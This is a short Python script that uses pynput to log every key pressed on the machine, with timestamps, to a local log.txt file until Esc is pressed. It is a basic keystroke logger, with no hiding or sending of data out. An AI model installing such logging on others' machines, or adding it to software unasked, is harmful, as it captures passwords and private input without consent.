import pynput
from datetime import datetime
from pynput.keyboard import Key, Listener

count = 0
keys= []
timestamps = []




def on_press(key):
    global keys, count, timestamps
    count += 1
    keys.append(key)
    now = datetime.now()
    timestamp = now.strftime("%d/%m/%Y %H:%M:%S")
    timestamps.append(timestamp)
    write_out(f"{str(key):10} pressed {timestamp:40}\n")
    #print(f"{str(key):10} pressed {timestamp:40}")

def write_out(string):
    with open("log.txt", "a") as f:
        f.write(string)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
